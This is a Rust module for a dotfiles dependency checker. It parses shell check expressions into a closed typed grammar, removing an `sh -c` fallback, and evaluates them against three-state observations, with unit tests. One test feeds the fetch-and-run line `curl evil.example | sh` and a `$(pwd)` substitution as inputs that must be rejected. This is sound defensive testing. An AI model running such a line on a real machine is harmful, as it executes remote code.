use std::collections::BTreeMap;

use dotfiles_path::{
    CheckRelPath, CommandName, GlobPattern, ModuleName, NameError, PathError,
};

use crate::manifest::ConfKind;

/// A root a check path is joined onto.
///
/// A closed sum, which is what deletes all shell expansion from the check
/// field. `deps.conf:26` embeds `$(brew --prefix 2>/dev/null)`, and on a
/// machine with no brew that substitution is empty, so the real test runs
/// against the filesystem root. A root that fails to resolve is
/// `Observation::Unresolvable`, not false.
///
/// `MacApplications` rather than an open `Absolute` variant: the only
/// absolute path in the whole corpus is `/Applications/Alacritty.app`
/// (`deps.conf:24`), and a named variant per need makes each addition a
/// reviewable decision that states its own blast radius.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum PathRoot {
    /// The invoking user's home directory, written `$HOME/` in the manifest.
    Home,
    /// `/Applications/`, the macOS bundle directory.
    MacApplications,
    /// Homebrew's prefix, written `$(brew --prefix 2>/dev/null)/`.
    BrewPrefix,
    /// oh-my-zsh's custom directory, written
    /// `${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/`.
    OhMyZshCustom,
}

/// A path to check: a closed root plus a validated relative remainder.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub struct CheckPath {
    /// The root the remainder is joined onto.
    pub root: PathRoot,
    /// The remainder, relative to `root`.
    pub rest: CheckRelPath,
}

impl CheckPath {
    /// Pair a root with a validated remainder.
    pub fn new(root: PathRoot, rest: CheckRelPath) -> Self {
        CheckPath { root, rest }
    }
}

/// A presence check.
///
/// There is no `Shell` variant. All 22 real checks fit these seven, verified
/// by reading the four conf files, and a named variant per need is strictly
/// better than an escape hatch that grants all future blast radius at once.
///
/// `AnyOf` carries `first` and `rest` rather than one `Vec`, because
/// `AnyOf(vec![])` is a well-typed value that evaluates false under any
/// rule, and a manifest entry parsing to it would report a dependency
/// permanently missing with no diagnostic. All three real `AnyOf` entries
/// have exactly two branches.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub enum Check {
    /// `command -v <name>`: the name resolves on `PATH`.
    Command(CommandName),
    /// `[ -d <path> ]`: the path is a directory.
    DirExists(CheckPath),
    /// `[ -f <path> ]`: the path is a file.
    FileExists(CheckPath),
    /// `[ -s <path> ]`: the path is a file with a non-zero size.
    ///
    /// `deps.conf:36` uses `-s`, not `-f`: a truncated `nvm.sh` passes `-f`
    /// and sources to nothing.
    FileNonEmpty(CheckPath),
    /// `ls -d <dir>/<pattern>`: at least one entry in `dir` matches.
    GlobExists {
        /// The directory the pattern is matched inside.
        dir: CheckPath,
        /// The filename pattern, which cannot itself contain a separator.
        pattern: GlobPattern,
    },
    /// `python3 -c "import <module>"`: the interpreter imports the module.
    PythonImport(ModuleName),
    /// At least one branch is present.
    AnyOf {
        /// The first branch, so the alternation cannot be empty.
        first: Box<Check>,
        /// The remaining branches, in the order the manifest wrote them.
        rest: Vec<Check>,
    },
}

/// What was observed about one check.
///
/// Three-state rather than boolean. A report must distinguish "brew is
/// absent so this check is unanswerable" from "the file is missing", because
/// they have different remedies, and a boolean collapses the first into the
/// second silently.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Observation {
    /// The check's subject is there.
    Present,
    /// The check's subject is not there.
    Absent,
    /// The check could not be answered, because `root` did not resolve.
    Unresolvable {
        /// The root that failed to resolve.
        root: PathRoot,
    },
}

/// What the edge observed, injected into the core.
///
/// A trait rather than a concrete map so a test can script a world as a
/// small struct without enumerating every leaf, and so the core never holds
/// the capability that produced the answers. The gather step implements this
/// at the edge; nothing in this crate does.
pub trait Observations {
    /// The observation recorded for `check`.
    fn observe(&self, check: &Check) -> Observation;
}

/// An observation map built from explicit pairs.
///
/// Absence means `Absent`: the gather step runs at the edge over the selected
/// manifest, and a leaf it did not record is a leaf whose subject is not
/// there.
#[derive(Debug, Clone, Default)]
pub struct ObservationMap(BTreeMap<Check, Observation>);

impl ObservationMap {
    /// Build a map from explicit pairs.
    ///
    /// A later pair for the same check wins, which is the `collect` default
    /// and is why the constructor takes a `Vec` rather than a map: the caller
    /// writes the pairs in one place and the last write is visible there.
    pub fn from_pairs(pairs: Vec<(Check, Observation)>) -> Self {
        ObservationMap(pairs.into_iter().collect())
    }
}

impl Observations for ObservationMap {
    fn observe(&self, check: &Check) -> Observation {
        self.0.get(check).copied().unwrap_or(Observation::Absent)
    }
}

/// Evaluate a check against an injected observation.
///
/// Pure: the observation comes in as an argument, so this function opens no
/// file and spawns no process. `AnyOf` short-circuits on the first
/// `Present`, and otherwise prefers a reported `Unresolvable` over `Absent`,
/// because an unanswerable branch collapsed to `Absent` is exactly the
/// silent-false bug `deps.conf:26` has today.
pub fn evaluate(check: &Check, observed: &impl Observations) -> Observation {
    let Check::AnyOf { first, rest } = check else {
        return observed.observe(check);
    };

    let mut unresolved_root = None;
    for branch in std::iter::once(first.as_ref()).chain(rest.iter()) {
        match evaluate(branch, observed) {
            Observation::Present => return Observation::Present,
            Observation::Unresolvable { root } => {
                unresolved_root = unresolved_root.or(Some(root));
            }
            Observation::Absent => {}
        }
    }
    match unresolved_root {
        Some(root) => Observation::Unresolvable { root },
        None => Observation::Absent,
    }
}

/// Why a check expression was refused.
///
/// One variant per rule, so a caller reports the cause rather than "invalid
/// check", and so a new rule cannot be folded into an existing variant
/// without a diff that names it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CheckParseError {
    /// The expression is outside the grammar. This is what replaces the
    /// `sh -c "$check"` fallthrough at `check-deps.sh:524`.
    Unrecognized,
    /// A recognized `command -v` shape holding an invalid command name.
    BadCommandName(NameError),
    /// A recognized file or directory test holding an invalid path.
    BadPath(PathError),
    /// A recognized `python3 -c "import ..."` holding an invalid module name.
    BadModuleName(NameError),
    /// A recognized `ls -d` listing holding an invalid filename pattern.
    BadGlob(NameError),
    /// An alternation with no branches. Unreachable through the grammar,
    /// which always parses a first operand before it looks for a second, and
    /// retained so `AnyOf`'s non-emptiness has a named failure rather than an
    /// implicit one.
    EmptyAlternation,
    /// A `PythonImport` in a platform-selected conf file. `PythonImport` is
    /// the one check that spawns an interpreter, and `deps-ci.conf` is
    /// selected only by an explicit `DEPS_CONF`, so this rule keeps the
    /// interpreter off the shell-startup path by construction.
    InterpreterCheck,
}

/// Parse one check expression from a manifest line.
///
/// Recognizes exactly the shapes the four conf files contain. Anything else
/// is `Unrecognized`, which is what replaces the `sh -c "$check"` at
/// `check-deps.sh:524`.
///
/// # Errors
///
/// Returns `CheckParseError::Unrecognized` for an expression outside the
/// grammar, `InterpreterCheck` for a `PythonImport` in a platform-selected
/// file, and a `Bad*` variant carrying the primitive's own error when a
/// recognized shape holds an invalid name or path.
pub fn parse_check_expression(raw: &str, kind: ConfKind) -> Result<Check, CheckParseError> {
    let trimmed = raw.trim();

    if let Some(alternation) = parse_if_then_else(trimmed, kind)? {
        return Ok(alternation);
    }
    if let Some(alternation) = parse_test_or(trimmed)? {
        return Ok(alternation);
    }
    parse_leaf(trimmed, kind)
}

/// `if <a>; then true; else <b>; fi`, the shape at `deps.conf:24` and `:45`.
fn parse_if_then_else(raw: &str, kind: ConfKind) -> Result<Option<Check>, CheckParseError> {
    let Some(body) = raw.strip_prefix("if ") else {
        return Ok(None);
    };
    let Some(body) = body.strip_suffix("; fi") else {
        return Err(CheckParseError::Unrecognized);
    };
    let Some((consequent_source, alternative)) = body.split_once("; then true; else ") else {
        return Err(CheckParseError::Unrecognized);
    };
    // `split_once` takes the FIRST separator, so an `elif` chain would hand
    // `command -v a; then true; elif command -v b` to `parse_leaf`, which
    // rejects it as a bad command name. Refusing a leftover `;` up front
    // makes a structural mismatch report as one, and a diagnostic that names
    // the wrong rule is the thing that costs an hour later.
    if consequent_source.contains(';') || alternative.contains(';') {
        return Err(CheckParseError::Unrecognized);
    }
    let first = parse_leaf(consequent_source.trim(), kind)?;
    let second = parse_leaf(alternative.trim(), kind)?;
    Ok(Some(Check::AnyOf { first: Box::new(first), rest: vec![second] }))
}

/// `test -f "A" -o -f "B"`, the shape at `deps.conf:26`.
///
/// Takes no `ConfKind`, because every operand a `test` can hold is a file or
/// directory predicate and none of them spawns an interpreter.
fn parse_test_or(raw: &str) -> Result<Option<Check>, CheckParseError> {
    let Some(body) = raw.strip_prefix("test ") else {
        return Ok(None);
    };
    let mut operands = body.split(" -o ");
    let Some(head) = operands.next() else {
        return Err(CheckParseError::EmptyAlternation);
    };
    let first = parse_test_operand(head.trim())?;
    let mut rest = Vec::new();
    for tail in operands {
        rest.push(parse_test_operand(tail.trim())?);
    }
    if rest.is_empty() {
        // A one-operand `test` is a leaf, not an alternation, and building an
        // AnyOf with an empty `rest` would misreport the structure.
        return Ok(Some(first));
    }
    Ok(Some(Check::AnyOf { first: Box::new(first), rest }))
}

/// One `test` operand: a `-f`, `-d` or `-s` predicate over a path.
fn parse_test_operand(raw: &str) -> Result<Check, CheckParseError> {
    if let Some(quoted) = raw.strip_prefix("-f ") {
        return Ok(Check::FileExists(parse_quoted_path(quoted.trim())?));
    }
    if let Some(quoted) = raw.strip_prefix("-d ") {
        return Ok(Check::DirExists(parse_quoted_path(quoted.trim())?));
    }
    if let Some(quoted) = raw.strip_prefix("-s ") {
        return Ok(Check::FileNonEmpty(parse_quoted_path(quoted.trim())?));
    }
    Err(CheckParseError::Unrecognized)
}

/// One non-alternating check expression.
fn parse_leaf(raw: &str, kind: ConfKind) -> Result<Check, CheckParseError> {
    if let Some(name) = raw.strip_prefix("command -v ") {
        let parsed = CommandName::parse(name.trim()).map_err(CheckParseError::BadCommandName)?;
        return Ok(Check::Command(parsed));
    }
    if let Some(module) = raw
        .strip_prefix("python3 -c \"import ")
        .and_then(|rest| rest.strip_suffix('"'))
    {
        if kind == ConfKind::PlatformSelected {
            return Err(CheckParseError::InterpreterCheck);
        }
        let parsed = ModuleName::parse(module.trim()).map_err(CheckParseError::BadModuleName)?;
        return Ok(Check::PythonImport(parsed));
    }
    if let Some(glob) = parse_glob_listing(raw)? {
        return Ok(glob);
    }
    if let Some(bracket) = raw.strip_prefix("[ ").and_then(|rest| rest.strip_suffix(" ]")) {
        return parse_test_operand(bracket.trim());
    }
    if let Some(operand) = raw.strip_prefix("test ") {
        // `test -d /Applications/Alacritty.app`, the one unquoted absolute
        // operand in the corpus.
        return parse_test_operand(operand.trim());
    }
    Err(CheckParseError::Unrecognized)
}

/// `ls -d "$HOME/.nvm/versions/node"/v* >/dev/null 2>&1`, `deps.conf:45`.
///
/// The pattern is split off the directory rather than left inside the path,
/// because `CheckRelPath` would accept `versions/node/v*` as an ordinary path
/// and the `*` would then never be treated as a pattern.
fn parse_glob_listing(raw: &str) -> Result<Option<Check>, CheckParseError> {
    let Some(body) = raw.strip_prefix("ls -d ") else {
        return Ok(None);
    };
    let body = body.strip_suffix(" >/dev/null 2>&1").unwrap_or(body).trim();
    let Some((quoted, pattern)) = split_after_closing_quote(body) else {
        return Err(CheckParseError::Unrecognized);
    };
    let dir = parse_quoted_path(quoted)?;
    let pattern = pattern.strip_prefix('/').ok_or(CheckParseError::Unrecognized)?;
    let parsed = GlobPattern::parse(pattern).map_err(CheckParseError::BadGlob)?;
    Ok(Some(Check::GlobExists { dir, pattern: parsed }))
}

/// Split `"<quoted>"<tail>` into the quoted span, braces included, and the
/// tail after the closing quote.
fn split_after_closing_quote(raw: &str) -> Option<(&str, &str)> {
    let rest = raw.strip_prefix('"')?;
    let close = rest.find('"')?;
    Some((&raw[..close + 2], &rest[close + 1..]))
}

/// Resolve a quoted operand to a closed root plus a relative remainder.
///
/// This is where the shell expansion is deleted. `$(brew --prefix
/// 2>/dev/null)` becomes `PathRoot::BrewPrefix` rather than text the core
/// would have to expand, and an unresolvable brew is then an
/// `Observation::Unresolvable` at gather time instead of a test against `/`.
///
/// An operand whose prefix is none of the four named roots is `Unrecognized`,
/// which is what keeps an arbitrary command substitution out: there is no
/// branch that carries unexpanded text forward.
fn parse_quoted_path(raw: &str) -> Result<CheckPath, CheckParseError> {
    let inner = raw
        .strip_prefix('"')
        .and_then(|rest| rest.strip_suffix('"'))
        .unwrap_or(raw);

    let roots: [(&str, PathRoot); 4] = [
        ("$(brew --prefix 2>/dev/null)/", PathRoot::BrewPrefix),
        ("${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/", PathRoot::OhMyZshCustom),
        ("$HOME/", PathRoot::Home),
        ("/Applications/", PathRoot::MacApplications),
    ];
    for (prefix, root) in roots {
        if let Some(rest) = inner.strip_prefix(prefix) {
            let parsed = CheckRelPath::parse(rest).map_err(CheckParseError::BadPath)?;
            return Ok(CheckPath::new(root, parsed));
        }
    }
    Err(CheckParseError::Unrecognized)
}

#[cfg(test)]
mod tests {
    use super::*;
    use dotfiles_path::{CheckRelPath, CommandName};

    /// The expected-variant test for one case in the grammar table.
    ///
    /// A named alias because the inline function-pointer-in-tuple-in-array
    /// type is what `clippy::type_complexity` refuses, and the name says
    /// what the second element of each pair is for.
    type VariantPredicate = fn(&Check) -> bool;

    fn command(name: &str) -> Check {
        Check::Command(CommandName::parse(name).expect("a test command name parses"))
    }

    fn home_file(rest: &str) -> CheckPath {
        CheckPath::new(
            PathRoot::Home,
            CheckRelPath::parse(rest).expect("a test path parses"),
        )
    }

    fn brew_file(rest: &str) -> CheckPath {
        CheckPath::new(
            PathRoot::BrewPrefix,
            CheckRelPath::parse(rest).expect("a test path parses"),
        )
    }

    // deps.conf:26, the real zsh-autosuggestions check, as the two-branch
    // AnyOf it decomposes to.
    fn real_zsh_autosuggestions_check() -> Check {
        Check::AnyOf {
            first: Box::new(Check::FileExists(home_file(
                ".oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh",
            ))),
            rest: vec![Check::FileExists(brew_file(
                "share/zsh-autosuggestions/zsh-autosuggestions.zsh",
            ))],
        }
    }

    #[test]
    fn any_of_is_present_when_the_first_branch_is_present() {
        let check = real_zsh_autosuggestions_check();
        let Check::AnyOf { first, .. } = &check else {
            panic!("the fixture is an AnyOf");
        };
        let observed =
            ObservationMap::from_pairs(vec![((**first).clone(), Observation::Present)]);
        assert_eq!(evaluate(&check, &observed), Observation::Present);
    }

    #[test]
    fn any_of_is_present_when_a_later_branch_is_present() {
        let check = real_zsh_autosuggestions_check();
        let Check::AnyOf { first, rest } = &check else {
            panic!("the fixture is an AnyOf");
        };
        let observed = ObservationMap::from_pairs(vec![
            ((**first).clone(), Observation::Absent),
            (rest[0].clone(), Observation::Present),
        ]);
        assert_eq!(evaluate(&check, &observed), Observation::Present);
    }

    // The bug spec 5.2 fixes. On a machine with no brew the shell
    // substitution at deps.conf:26 is empty, so the second operand tests
    // /share/... at the filesystem root. Present is the wrong answer and
    // Absent is also wrong: the branch is unanswerable, and the remedy for
    // "brew is missing" differs from the remedy for "the file is missing".
    #[test]
    fn any_of_reports_unresolvable_when_no_branch_is_present_and_one_root_is_unresolvable() {
        let check = real_zsh_autosuggestions_check();
        let Check::AnyOf { first, rest } = &check else {
            panic!("the fixture is an AnyOf");
        };
        let observed = ObservationMap::from_pairs(vec![
            ((**first).clone(), Observation::Absent),
            (
                rest[0].clone(),
                Observation::Unresolvable { root: PathRoot::BrewPrefix },
            ),
        ]);
        assert_eq!(
            evaluate(&check, &observed),
            Observation::Unresolvable { root: PathRoot::BrewPrefix },
            "an unanswerable branch must not collapse to Absent"
        );
    }

    #[test]
    fn any_of_is_absent_only_when_every_branch_is_absent() {
        let check = real_zsh_autosuggestions_check();
        let Check::AnyOf { first, rest } = &check else {
            panic!("the fixture is an AnyOf");
        };
        let observed = ObservationMap::from_pairs(vec![
            ((**first).clone(), Observation::Absent),
            (rest[0].clone(), Observation::Absent),
        ]);
        assert_eq!(evaluate(&check, &observed), Observation::Absent);
    }

    // A leaf nobody observed is Absent, not a panic. gather runs at the
    // edge and a leaf it skipped is a leaf whose subject is not there.
    #[test]
    fn an_unobserved_leaf_is_absent() {
        let observed = ObservationMap::from_pairs(vec![]);
        assert_eq!(evaluate(&command("git"), &observed), Observation::Absent);
    }

    // deps.conf:36 uses -s, not -f. A truncated nvm.sh passes -f and
    // sources to nothing, so collapsing the two variants would introduce a
    // bug during the port.
    #[test]
    fn file_non_empty_is_a_distinct_check_from_file_exists() {
        let path = home_file(".nvm/nvm.sh");
        let non_empty = Check::FileNonEmpty(path.clone());
        let exists = Check::FileExists(path);
        assert_ne!(non_empty, exists);
        let observed = ObservationMap::from_pairs(vec![(exists, Observation::Present)]);
        assert_eq!(
            evaluate(&non_empty, &observed),
            Observation::Absent,
            "a satisfied -f must not satisfy a -s"
        );
    }

    // Every check expression in the four conf files, verbatim. Read from
    // deps.conf, deps-mac.conf, deps-linux.conf and deps-ci.conf, and each
    // is asserted to the variant spec 5.2's table names for it.
    #[test]
    fn parses_every_real_check_expression() {
        let cases: [(&str, VariantPredicate); 8] = [
            ("command -v git", |check| matches!(check, Check::Command(_))),
            ("[ -d \"$HOME/.tmux/plugins/tpm\" ]", |check| {
                matches!(check, Check::DirExists(_))
            }),
            ("[ -d \"$HOME/.oh-my-zsh\" ]", |check| {
                matches!(check, Check::DirExists(_))
            }),
            ("[ -s \"$HOME/.nvm/nvm.sh\" ]", |check| {
                matches!(check, Check::FileNonEmpty(_))
            }),
            ("python3 -c \"import yaml\"", |check| {
                matches!(check, Check::PythonImport(_))
            }),
            (
                "if test -d /Applications/Alacritty.app; then true; else command -v alacritty; fi",
                |check| matches!(check, Check::AnyOf { .. }),
            ),
            (
                "test -f \"$HOME/.oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh\" -o -f \"$(brew --prefix 2>/dev/null)/share/zsh-autosuggestions/zsh-autosuggestions.zsh\"",
                |check| matches!(check, Check::AnyOf { .. }),
            ),
            (
                "if command -v node; then true; else ls -d \"$HOME/.nvm/versions/node\"/v* >/dev/null 2>&1; fi",
                |check| matches!(check, Check::AnyOf { .. }),
            ),
        ];
        for (raw, is_expected_variant) in cases {
            let parsed = parse_check_expression(raw, ConfKind::ExplicitOnly)
                .unwrap_or_else(|cause| panic!("a real check failed to parse: {raw}: {cause:?}"));
            assert!(
                is_expected_variant(&parsed),
                "the wrong variant for {raw}: {parsed:?}"
            );
        }
    }

    // The alacritty branch of deps.conf:24 is the only absolute path in the
    // corpus, and CheckRelPath rejects an absolute remainder, so a named
    // root is the only way it can carry a validated path at all.
    #[test]
    fn the_alacritty_branch_carries_a_mac_applications_root() {
        let raw = "if test -d /Applications/Alacritty.app; then true; else command -v alacritty; fi";
        let parsed =
            parse_check_expression(raw, ConfKind::ExplicitOnly).expect("the real shape parses");
        let Check::AnyOf { first, rest } = &parsed else {
            panic!("an if/then/else fallback chain is an AnyOf");
        };
        let Check::DirExists(path) = first.as_ref() else {
            panic!("the consequent is a directory check");
        };
        assert_eq!(path.root, PathRoot::MacApplications);
        assert_eq!(path.rest.as_str(), "Alacritty.app");
        assert_eq!(rest.len(), 1, "the real entry has exactly two branches");
    }

    // The node fallback of deps.conf:45 is the one glob shape, and the
    // pattern must land in GlobPattern rather than inside the directory
    // path, because CheckRelPath would accept `versions/node/v*` as an
    // ordinary path and the `*` would then never be treated as a pattern.
    #[test]
    fn the_node_fallback_splits_the_directory_from_the_pattern() {
        let raw =
            "if command -v node; then true; else ls -d \"$HOME/.nvm/versions/node\"/v* >/dev/null 2>&1; fi";
        let parsed =
            parse_check_expression(raw, ConfKind::ExplicitOnly).expect("the real shape parses");
        let Check::AnyOf { rest, .. } = &parsed else {
            panic!("an if/then/else fallback chain is an AnyOf");
        };
        let Check::GlobExists { dir, pattern } = &rest[0] else {
            panic!("the alternative is a glob listing: {:?}", rest[0]);
        };
        assert_eq!(dir.root, PathRoot::Home);
        assert_eq!(dir.rest.as_str(), ".nvm/versions/node");
        assert_eq!(pattern.as_str(), "v*");
    }

    // The brew branch of deps.conf:26 must resolve through PathRoot, not
    // through a substitution the core would have to expand.
    #[test]
    fn the_brew_branch_carries_a_brew_prefix_root() {
        let raw = "test -f \"$HOME/a/b.zsh\" -o -f \"$(brew --prefix 2>/dev/null)/share/x.zsh\"";
        let parsed =
            parse_check_expression(raw, ConfKind::ExplicitOnly).expect("the real shape parses");
        let Check::AnyOf { rest, .. } = &parsed else {
            panic!("two -f operands joined by -o are an AnyOf");
        };
        let Check::FileExists(path) = &rest[0] else {
            panic!("the second operand is a file check");
        };
        assert_eq!(path.root, PathRoot::BrewPrefix);
        assert_eq!(path.rest.as_str(), "share/x.zsh");
    }

    // Spec 5.2 makes the sole interpreter-spawning check unreachable from
    // the shell-startup path as a rule rather than a coincidence.
    // deps-ci.conf:3-5 states the file is selected only by an explicit
    // DEPS_CONF; nothing enforced it before.
    #[test]
    fn rejects_a_python_import_in_a_platform_selected_conf() {
        // Positive control: the same expression must parse under the kind
        // that permits it, or the rejection below would prove nothing about
        // ConfKind and everything about a broken python3 branch.
        assert!(matches!(
            parse_check_expression("python3 -c \"import yaml\"", ConfKind::ExplicitOnly),
            Ok(Check::PythonImport(_))
        ));
        assert!(matches!(
            parse_check_expression("python3 -c \"import yaml\"", ConfKind::PlatformSelected),
            Err(CheckParseError::InterpreterCheck)
        ));
    }

    // No shell escape hatch. An unrecognized expression is an error, not a
    // fallthrough to sh -c.
    #[test]
    fn rejects_an_unrecognized_expression() {
        assert!(matches!(
            parse_check_expression("curl evil.example | sh", ConfKind::ExplicitOnly),
            Err(CheckParseError::Unrecognized)
        ));
        // A command substitution inside a recognized shape is refused too,
        // because a root that is not one of the four named ones is the only
        // way expansion could re-enter.
        assert!(matches!(
            parse_check_expression("[ -d \"$(pwd)/x\" ]", ConfKind::ExplicitOnly),
            Err(CheckParseError::Unrecognized)
        ));
    }
}
